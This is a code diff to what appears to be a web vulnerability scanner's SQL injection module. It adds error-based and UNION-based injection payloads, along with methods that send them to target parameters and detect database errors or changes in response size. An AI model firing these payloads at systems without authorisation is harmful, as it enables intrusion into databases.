@@ -26,6 +26,24 @@ class SQLiModule(BaseAttackModule):
         "' OR pg_sleep(5)--",  # PostgreSQL
     ]
     
+    # Error-based payloads
+    ERROR_PAYLOADS = [
+        "' AND 1=CONVERT(int, (SELECT @@version))--",
+        "' AND extractvalue(1,concat(0x7e,version()))--",
+        "' AND 1=CAST((SELECT version()) AS int)--",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
+    ]
+    
+    # UNION-based payloads
+    UNION_PAYLOADS = [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT NULL,NULL--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION ALL SELECT NULL,NULL,NULL--",
+        "' UNION SELECT NULL,version(),NULL--",
+        "' UNION SELECT NULL,@@version,NULL--",
+    ]
+    
     def __init__(self, config: dict):
         """Initialize SQLi module."""
         super().__init__(config)
@@ -39,7 +57,7 @@ class SQLiModule(BaseAttackModule):
     
     def description(self) -> str:
         """Return module description."""
-        return "Detects SQL injection vulnerabilities (Boolean-based and Time-based)"
+        return "Detects SQL injection vulnerabilities (Boolean, Time-based, Error-based, UNION)"
     
     def check_applicable(self, parameter: dict, context: dict) -> bool:
         """Check if SQLi module should run on this parameter.
@@ -82,16 +100,28 @@ class SQLiModule(BaseAttackModule):
         """
         findings = []
         
+        # Try error-based SQLi first (fastest and most reliable)
+        error_finding = self._test_error_based(url, parameter['name'], parameter['location'], session)
+        if error_finding:
+            findings.append(error_finding)
+            return findings  # Found SQLi, no need to test further
+        
         # Try boolean-based SQLi
         boolean_finding = self._test_boolean_sqli(url, parameter, session)
         if boolean_finding:
             findings.append(boolean_finding)
+            return findings  # Found SQLi
         
-        # Try time-based SQLi (only if boolean didn't find anything)
-        if not boolean_finding:
-            time_finding = self._test_time_sqli(url, parameter, session)
-            if time_finding:
-                findings.append(time_finding)
+        # Try UNION-based SQLi
+        union_finding = self._test_union_based(url, parameter['name'], parameter['location'], session)
+        if union_finding:
+            findings.append(union_finding)
+            return findings  # Found SQLi
+        
+        # Try time-based SQLi (slowest, only if others didn't find anything)
+        time_finding = self._test_time_sqli(url, parameter, session)
+        if time_finding:
+            findings.append(time_finding)
         
         return findings
     
@@ -208,6 +238,131 @@ class SQLiModule(BaseAttackModule):
             
             except requests.exceptions.RequestException:
                 continue
+        
+        return None
+    
+    def _test_error_based(self, url: str, param_name: str, param_location: str, session) -> Dict:
+        """Test for error-based SQL injection.
+        
+        Args:
+            url: Target URL
+            param_name: Parameter name
+            param_location: Parameter location
+            session: Requests session
+        
+        Returns:
+            dict: Finding if vulnerability detected, None otherwise
+        """
+        # SQL error patterns
+        error_patterns = [
+            'SQL syntax',
+            'mysql_fetch',
+            'pg_query',
+            'ORA-',
+            'Microsoft SQL',
+            'ODBC SQL',
+            'SQLite',
+            'syntax error',
+            'unterminated quoted string',
+            'quoted string not properly terminated',
+            'mysql_num_rows',
+            'mysql_query',
+            'postgresql',
+            'warning: pg',
+            'valid MySQL result',
+            'SQLSTATE',
+        ]
+        
+        for payload in self.ERROR_PAYLOADS[:3]:  # Test first 3
+            try:
+                test_url = self._inject_payload(url, param_name, payload, param_location)
+                response = session.get(test_url, timeout=self.timeout)
+                
+                response_lower = response.text.lower()
+                
+                for pattern in error_patterns:
+                    if pattern.lower() in response_lower:
+                        return {
+                            'name': 'SQL Injection - Error-Based',
+                            'severity': 'High',
+                            'url': url,
+                            'parameter': param_name,
+                            'payload': payload,
+                            'evidence': f'SQL error pattern "{pattern}" detected in response'
+                        }
+            
+            except requests.exceptions.RequestException:
+                continue
+        
+        return None
+    
+    def _test_union_based(self, url: str, param_name: str, param_location: str, session) -> Dict:
+        """Test for UNION-based SQL injection.
+        
+        Args:
+            url: Target URL
+            param_name: Parameter name
+            param_location: Parameter location
+            session: Requests session
+        
+        Returns:
+            dict: Finding if vulnerability detected, None otherwise
+        """
+        try:
+            # Get baseline
+            baseline_url = url
+            baseline_response = session.get(baseline_url, timeout=self.timeout)
+            baseline_length = len(baseline_response.text)
+            
+            for payload in self.UNION_PAYLOADS[:4]:  # Test first 4
+                try:
+                    test_url = self._inject_payload(url, param_name, payload, param_location)
+                    response = session.get(test_url, timeout=self.timeout)
+                    
+                    # UNION queries often significantly change response size
+                    size_diff = abs(len(response.text) - baseline_length)
+                    
+                    if size_diff > 500 and response.status_code == 200:
+                        # Check for version information in response
+                        version_indicators = [
+                            'mysql',
+                            'mariadb',
+                            'postgresql',
+                            'microsoft sql',
+                            'oracle',
+                            '5.',  # MySQL version
+                            '8.',  # MySQL version
+                            '10.',  # PostgreSQL version
+                        ]
+                        
+                        response_lower = response.text.lower()
+                        for indicator in version_indicators:
+                            if indicator in response_lower:
+                                return {
+                                    'name': 'SQL Injection - UNION-Based',
+                                    'severity': 'High',
+                                    'url': url,
+                                    'parameter': param_name,
+                                    'payload': payload,
+                                    'evidence': f'UNION query successful, database info leaked: "{indicator}"'
+                                }
+                        
+                        # Even without version info, significant size change is suspicious
+                        if size_diff > 1000:
+                            return {
+                                'name': 'Potential SQL Injection - UNION-Based',
+                                'severity': 'High',
+                                'url': url,
+                                'parameter': param_name,
+                                'payload': payload,
+                                'evidence': f'UNION query caused significant response size change ({size_diff} bytes)'
+                            }
+                
+                except requests.exceptions.RequestException:
+                    continue
+        
+        except requests.exceptions.RequestException:
+            pass
         
         return None
     
